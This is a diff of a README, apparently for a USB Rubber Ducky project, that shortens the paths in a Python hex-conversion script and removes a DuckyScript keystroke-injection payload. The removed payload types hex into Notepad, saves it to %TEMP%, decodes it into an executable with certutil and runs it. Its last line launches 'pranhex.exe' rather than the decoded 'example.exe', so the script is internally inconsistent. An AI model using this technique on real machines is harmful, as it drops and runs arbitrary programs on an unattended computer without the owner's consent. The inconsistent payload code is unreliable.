@@ -41,37 +41,9 @@ def convert_to_hex(filename, output_file):
         output.write(hex_code)
 
 # Esempio di utilizzo
-exe_filename = 'C:/Users/Aleff/Documents/Install_And_Run_Any_Arbitrary_Executable-No_Internet_Needed/assets/dist/example.exe'
-output_filename = 'C:/Users/Aleff/Documents/Install_And_Run_Any_Arbitrary_Executable-No_Internet_Needed/assets/example.hex'
+exe_filename = './example.exe'
+output_filename = './example.hex'
 convert_to_hex(exe_filename, output_filename)
 ```
 
-- Create the DuckyScript payload
-
-```duckyscript
-GUI r
-DELAY 1000
-STRINGLN notepad.exe
-DELAY 2000
-STRING #HEX_CODE
-DELAY 2000
-ALT F
-DELAY 1000
-STRING S
-DELAY 1000
-STRINGLN "%TEMP%\example.hex"
-DELAY 1000
-ENTER
-DELAY 1000
-ALT F4
-DELAY 2000
-GUI r
-DELAY 500
-STRINGLN certutil -f -decodeHex "%TEMP%\example.hex" "%TEMP%\example.exe"
-DELAY 1000
-ENTER
-DELAY 1000
-GUI r
-DELAY 250
-STRINGLN "%TEMP%\pranhex.exe"
-```
+- Use the DuckyScript payload
